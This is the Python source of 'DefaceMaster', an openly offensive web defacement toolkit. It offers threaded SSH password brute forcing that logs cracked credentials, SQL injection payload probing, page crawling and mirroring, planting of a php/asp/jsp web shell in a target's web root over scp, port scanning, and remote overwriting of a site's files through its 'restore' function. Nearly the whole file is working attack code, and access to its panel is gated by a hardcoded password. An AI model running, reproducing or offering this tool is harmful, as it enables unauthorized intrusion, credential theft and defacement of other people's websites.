#!/usr/bin/env python3
import os
import sys
import requests
import subprocess
import getpass
import socket
import threading
import shutil
from bs4 import BeautifulSoup
from time import gmtime, strftime

# Color codes
RED = '\033[0;31m'
GREEN = '\033[0;32m'
YELLOW = '\033[0;33m'
BLUE = '\033[0;34m'
PURPLE = '\033[0;35m'
CYAN = '\033[0;36m'
MAGENTA = '\033[1;35m'
NC = '\033[0m'

# Global variables
SSH_USER = ""
SSH_PORT = "22"
TARGET_IP = ""
TARGET_URL = ""
WEB_AUTH = ("", "")  # (username, password)
METHOD = ""
SESSION_COOKIES = {}

def initialize():
    """Initialize required directories and files"""
    if not os.path.exists("backups"):
        os.makedirs("backups")
    if not os.path.exists("downloads"):
        os.makedirs("downloads")
    if not os.path.exists("uploads"):
        os.makedirs("uploads")

def print_banner():
    os.system("clear")
    print(f"{MAGENTA}")
    os.system('figlet -f slant "DefaceMaster"')
    print(f"{NC}")
    print(f"{CYAN}Advanced Web Defacement Tool with Multiple Functions{NC}")
    print(f"{YELLOW}Version 2.0 | Use responsibly and legally{NC}\n")

def check_dependencies():
    """Check for required dependencies"""
    required = ['figlet', 'ssh', 'scp']
    missing = []
    
    for dep in required:
        try:
            subprocess.check_call(["which", dep], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            missing.append(dep)
    
    if missing:
        print(f"{RED}Missing dependencies:{NC}")
        for dep in missing:
            print(f"- {dep}")
        print(f"\n{YELLOW}Install missing dependencies before proceeding.{NC}")
        return False
    return True

def check_ssh_connection():
    if not all([SSH_USER, TARGET_IP]):
        print(f"{RED}SSH credentials not configured!{NC}")
        return False
        
    try:
        result = subprocess.run(
            f"ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} 'echo \"Testing connection\"'",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=5
        )
        if result.returncode == 0:
            print(f"{GREEN}SSH Access Granted{NC}")
            return True
        else:
            print(f"{RED}SSH Access Denied{NC}")
            return False
    except:
        print(f"{RED}SSH Connection Failed{NC}")
        return False

def check_web_connection():
    if not TARGET_URL:
        print(f"{RED}Web target not configured!{NC}")
        return False
        
    try:
        auth = WEB_AUTH if WEB_AUTH[0] else None
        response = requests.get(TARGET_URL, auth=auth, cookies=SESSION_COOKIES, timeout=5)
        if response.status_code == 200:
            print(f"{GREEN}Website Access Granted{NC}")
            return True
        else:
            print(f"{RED}Website returned status: {response.status_code}{NC}")
            return False
    except Exception as e:
        print(f"{RED}Web Connection Failed: {e}{NC}")
        return False

def brute_force_ssh():
    if not TARGET_IP:
        print(f"{RED}Target IP not configured!{NC}")
        return
    
    print(f"\n{YELLOW}SSH Brute Force Attack{NC}")
    print(f"{RED}WARNING: This may take a long time and could lock accounts{NC}")
    
    user_list = input(f"{MAGENTA}Path to username list (default: common_users.txt): {NC}") or "common_users.txt"
    pass_list = input(f"{MAGENTA}Path to password list (default: common_passwords.txt): {NC}") or "common_passwords.txt"
    port = input(f"{MAGENTA}SSH port (default: 22): {NC}") or "22"
    threads = input(f"{MAGENTA}Number of threads (default: 5): {NC}") or "5"
    
    try:
        threads = int(threads)
        if threads < 1 or threads > 20:
            print(f"{RED}Thread count must be between 1-20{NC}")
            return
    except ValueError:
        print(f"{RED}Invalid thread count{NC}")
        return
    
    def ssh_attempt(user, password):
        try:
            ssh = subprocess.Popen(
                ['sshpass', '-p', password, 'ssh', '-p', port, f'{user}@{TARGET_IP}', 'exit'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            _, stderr = ssh.communicate()
            if ssh.returncode == 0:
                print(f"\n{GREEN}Success! Credentials found:{NC}")
                print(f"Username: {user}")
                print(f"Password: {password}")
                with open("found_credentials.txt", "a") as f:
                    f.write(f"SSH - {user}:{password}@{TARGET_IP}:{port}\n")
                return True
        except:
            pass
        return False
    
    try:
        with open(user_list) as users, open(pass_list) as passwords:
            user_list = [u.strip() for u in users if u.strip()]
            pass_list = [p.strip() for p in passwords if p.strip()]
            
            print(f"\n{YELLOW}Starting brute force with {len(user_list)} users and {len(pass_list)} passwords{NC}")
            
            for user in user_list:
                for password in pass_list:
                    t = threading.Thread(target=ssh_attempt, args=(user, password))
                    t.start()
                    while threading.active_count() > threads:
                        pass
                        
    except FileNotFoundError:
        print(f"{RED}User/password list files not found!{NC}")
    except Exception as e:
        print(f"{RED}Error during brute force: {e}{NC}")

def web_crawler():
    if not TARGET_URL:
        print(f"{RED}Web target not configured!{NC}")
        return
    
    print(f"\n{YELLOW}Web Crawler{NC}")
    max_depth = input(f"{MAGENTA}Maximum depth to crawl (default: 2): {NC}") or "2"
    
    try:
        max_depth = int(max_depth)
        if max_depth < 1 or max_depth > 5:
            print(f"{RED}Depth must be between 1-5{NC}")
            return
    except ValueError:
        print(f"{RED}Invalid depth value{NC}")
        return
    
    visited = set()
    to_visit = [(TARGET_URL, 0)]
    
    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
            
        visited.add(url)
        print(f"{BLUE}Crawling: {url}{NC}")
        
        try:
            auth = WEB_AUTH if WEB_AUTH[0] else None
            response = requests.get(url, auth=auth, cookies=SESSION_COOKIES, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Save page content
            with open(f"downloads/{url.replace('/', '_')}.html", "w") as f:
                f.write(response.text)
            
            # Find all links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith(('http://', 'https://')):
                    if TARGET_URL in href and href not in visited:
                        to_visit.append((href, depth+1))
                elif href.startswith('/'):
                    full_url = requests.compat.urljoin(TARGET_URL, href)
                    if full_url not in visited:
                        to_visit.append((full_url, depth+1))
                        
        except Exception as e:
            print(f"{RED}Error crawling {url}: {e}{NC}")
    
    while to_visit:
        url, depth = to_visit.pop(0)
        crawl(url, depth)
    
    print(f"\n{GREEN}Crawling complete!{NC}")
    print(f"Found {len(visited)} pages")
    with open("crawled_urls.txt", "w") as f:
        f.write("\n".join(visited))

def sql_injection_test():
    if not TARGET_URL:
        print(f"{RED}Web target not configured!{NC}")
        return
    
    print(f"\n{YELLOW}SQL Injection Tester{NC}")
    test_url = input(f"{MAGENTA}URL to test (with parameters): {NC}") or TARGET_URL
    
    payloads = [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "' OR 'a'='a"
    ]
    
    vulnerable = False
    
    for payload in payloads:
        try:
            if '?' in test_url:
                test_url_p = test_url + payload
            else:
                test_url_p = test_url + '?id=' + payload
                
            response = requests.get(test_url_p, cookies=SESSION_COOKIES, timeout=5)
            
            if any(error in response.text.lower() for error in ['sql', 'syntax', 'mysql', 'database']):
                print(f"{RED}Possible SQLi vulnerability found with payload: {payload}{NC}")
                vulnerable = True
                with open("sql_injection.txt", "a") as f:
                    f.write(f"Vulnerable URL: {test_url_p}\nPayload: {payload}\n\n")
            else:
                print(f"{GREEN}No vulnerability found with payload: {payload}{NC}")
                
        except Exception as e:
            print(f"{RED}Error testing payload {payload}: {e}{NC}")
    
    if vulnerable:
        print(f"\n{RED}SQL Injection vulnerabilities found!{NC}")
        print(f"Details saved to sql_injection.txt")
    else:
        print(f"\n{GREEN}No SQL Injection vulnerabilities detected{NC}")

def upload_shell():
    if not check_ssh_connection():
        return
    
    print(f"\n{YELLOW}Web Shell Upload{NC}")
    shell_type = input(f"{MAGENTA}Shell type (php/asp/jsp, default: php): {NC}") or "php"
    web_root = input(f"{MAGENTA}Web root path (default: /var/www/html): {NC}") or "/var/www/html"
    
    shell_name = "shell." + shell_type
    shell_path = os.path.join("uploads", shell_name)
    
    if not os.path.exists(shell_path):
        print(f"{RED}Shell file not found in uploads directory!{NC}")
        return
    
    try:
        # Upload shell
        os.system(f'scp -P {SSH_PORT} {shell_path} {SSH_USER}@{TARGET_IP}:{web_root}/{shell_name}')
        
        # Set permissions
        os.system(f'ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} "chmod 755 {web_root}/{shell_name}"')
        
        print(f"\n{GREEN}Shell uploaded successfully!{NC}")
        print(f"Access at: http://{TARGET_IP}/{shell_name}")
        
        with open("shell_logs.txt", "a") as f:
            f.write(f"Shell uploaded to {TARGET_IP}:{web_root}/{shell_name} at {strftime('%Y-%m-%d %H:%M:%S', gmtime())}\n")
            
    except Exception as e:
        print(f"{RED}Error uploading shell: {e}{NC}")

def port_scanner():
    if not TARGET_IP:
        print(f"{RED}Target IP not configured!{NC}")
        return
    
    print(f"\n{YELLOW}Port Scanner{NC}")
    start_port = input(f"{MAGENTA}Start port (default: 1): {NC}") or "1"
    end_port = input(f"{MAGENTA}End port (default: 1024): {NC}") or "1024"
    threads = input(f"{MAGENTA}Threads (default: 50): {NC}") or "50"
    
    try:
        start_port = int(start_port)
        end_port = int(end_port)
        threads = int(threads)
        
        if start_port < 1 or start_port > 65535:
            print(f"{RED}Invalid start port{NC}")
            return
        if end_port < 1 or end_port > 65535:
            print(f"{RED}Invalid end port{NC}")
            return
        if end_port < start_port:
            print(f"{RED}End port must be greater than start port{NC}")
            return
        if threads < 1 or threads > 200:
            print(f"{RED}Threads must be between 1-200{NC}")
            return
    except ValueError:
        print(f"{RED}Invalid input{NC}")
        return
    
    open_ports = []
    lock = threading.Lock()
    
    def scan_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            if result == 0:
                with lock:
                    open_ports.append(port)
                    print(f"{GREEN}Port {port} is open{NC}")
        except:
            pass
    
    print(f"\n{YELLOW}Scanning ports {start_port}-{end_port} on {TARGET_IP}{NC}")
    
    for port in range(start_port, end_port + 1):
        while threading.active_count() > threads:
            pass
        t = threading.Thread(target=scan_port, args=(port,))
        t.start()
    
    while threading.active_count() > 1:
        pass
    
    print(f"\n{GREEN}Scan complete!{NC}")
    print(f"Open ports: {sorted(open_ports)}")
    with open("port_scan.txt", "a") as f:
        f.write(f"Scan of {TARGET_IP} at {strftime('%Y-%m-%d %H:%M:%S', gmtime())}\n")
        f.write(f"Open ports: {sorted(open_ports)}\n\n")

def backup_site():
    if not check_ssh_connection():
        return
    
    print(f"\n{YELLOW}Website Backup{NC}")
    web_root = input(f"{MAGENTA}Web root path (default: /var/www/html): {NC}") or "/var/www/html"
    backup_name = input(f"{MAGENTA}Backup name (default: site_backup): {NC}") or "site_backup"
    
    try:
        # Create backup on server
        os.system(f'ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} "tar -czf /tmp/{backup_name}.tar.gz {web_root}"')
        
        # Download backup
        os.system(f'scp -P {SSH_PORT} {SSH_USER}@{TARGET_IP}:/tmp/{backup_name}.tar.gz backups/')
        
        # Clean up
        os.system(f'ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} "rm /tmp/{backup_name}.tar.gz"')
        
        print(f"\n{GREEN}Backup created successfully!{NC}")
        print(f"Saved to: backups/{backup_name}.tar.gz")
        
        with open("backup_logs.txt", "a") as f:
            f.write(f"Backup created of {web_root} at {strftime('%Y-%m-%d %H:%M:%S', gmtime())}\n")
            
    except Exception as e:
        print(f"{RED}Error creating backup: {e}{NC}")

def restore_site():
    if not check_ssh_connection():
        return
    
    print(f"\n{YELLOW}Website Restore{NC}")
    backup_file = input(f"{MAGENTA}Backup file path (from backups/): {NC}")
    web_root = input(f"{MAGENTA}Web root path to restore to (default: /var/www/html): {NC}") or "/var/www/html"
    
    if not os.path.exists(f"backups/{backup_file}"):
        print(f"{RED}Backup file not found!{NC}")
        return
    
    try:
        # Upload backup
        os.system(f'scp -P {SSH_PORT} backups/{backup_file} {SSH_USER}@{TARGET_IP}:/tmp/restore.tar.gz')
        
        # Extract backup
        os.system(f'ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} "tar -xzf /tmp/restore.tar.gz -C {web_root}"')
        
        # Clean up
        os.system(f'ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} "rm /tmp/restore.tar.gz"')
        
        print(f"\n{GREEN}Site restored successfully!{NC}")
        
        with open("backup_logs.txt", "a") as f:
            f.write(f"Site restored from {backup_file} at {strftime('%Y-%m-%d %H:%M:%S', gmtime())}\n")
            
    except Exception as e:
        print(f"{RED}Error restoring site: {e}{NC}")

def configure_ssh():
    global SSH_USER, SSH_PORT, TARGET_IP
    SSH_USER = input(f"{MAGENTA}Enter SSH username: {NC}") or "root"
    SSH_PORT = input(f"{MAGENTA}Enter SSH port (default 22): {NC}") or "22"
    TARGET_IP = input(f"{MAGENTA}Enter target IP: {NC}")
    print(f"{YELLOW}Testing SSH connection...{NC}")
    check_ssh_connection()

def configure_web():
    global TARGET_URL, WEB_AUTH, SESSION_COOKIES
    TARGET_URL = input(f"{MAGENTA}Enter target URL (e.g., http://example.com): {NC}")
    use_auth = input(f"{MAGENTA}Does the site require authentication? (y/n): {NC}").lower()
    if use_auth == 'y':
        username = input(f"{MAGENTA}Enter username: {NC}")
        password = getpass.getpass(f"{MAGENTA}Enter password: {NC}")
        WEB_AUTH = (username, password)
    print(f"{YELLOW}Testing web connection...{NC}")
    check_web_connection()

def menu():
    global METHOD
    
    while True:
        print(f"\n{MAGENTA}=== DefaceMaster Main Menu ==={NC}")
        print("1. Configure SSH access")
        print("2. Configure Web access")
        print("3. SSH Brute Force Attack")
        print("4. Web Crawler")
        print("5. SQL Injection Tester")
        print("6. Upload Web Shell")
        print("7. Port Scanner")
        print("8. Backup Website")
        print("9. Restore Website")
        print("10. View Logs")
        print("11. Exit")
        
        option = input(f"{MAGENTA}Choose an option: {NC}")
        
        if option == "1":
            configure_ssh()
            METHOD = "ssh"
        elif option == "2":
            configure_web()
            METHOD = "web"
        elif option == "3":
            brute_force_ssh()
        elif option == "4":
            web_crawler()
        elif option == "5":
            sql_injection_test()
        elif option == "6":
            upload_shell()
        elif option == "7":
            port_scanner()
        elif option == "8":
            backup_site()
        elif option == "9":
            restore_site()
        elif option == "10":
            view_logs()
        elif option == "11":
            sys.exit(0)
        else:
            print(f"{RED}Invalid option!{NC}")

def view_logs():
    print(f"\n{MAGENTA}=== Log Viewer ==={NC}")
    logs = [
        ("SSH Brute Force Results", "found_credentials.txt"),
        ("SQL Injection Results", "sql_injection.txt"),
        ("Port Scan Results", "port_scan.txt"),
        ("Shell Upload Logs", "shell_logs.txt"),
        ("Backup/Restore Logs", "backup_logs.txt"),
        ("Crawled URLs", "crawled_urls.txt")
    ]
    
    for i, (name, file) in enumerate(logs, 1):
        print(f"{i}. View {name}")
    
    print(f"{len(logs)+1}. Back to main menu")
    
    choice = input(f"{MAGENTA}Choose log to view: {NC}")
    
    try:
        choice = int(choice)
        if 1 <= choice <= len(logs):
            _, log_file = logs[choice-1]
            try:
                with open(log_file) as f:
                    print(f"\n{YELLOW}=== {logs[choice-1][0]} ==={NC}")
                    print(f.read())
            except FileNotFoundError:
                print(f"{RED}Log file not found!{NC}")
        elif choice == len(logs)+1:
            return
        else:
            print(f"{RED}Invalid choice!{NC}")
    except ValueError:
        print(f"{RED}Please enter a number!{NC}")

if __name__ == "__main__":
    if not check_dependencies():
        sys.exit(1)
    
    initialize()
    print_banner()
    
    PASSWORD = "supersecret"
    input_password = getpass.getpass(f"{YELLOW}Enter password to access panel: {NC}")

    if input_password != PASSWORD:
        print(f"{RED}Wrong password!{NC}")
        sys.exit(1)

    print(f"{GREEN}Authentication successful!{NC}")
    menu()
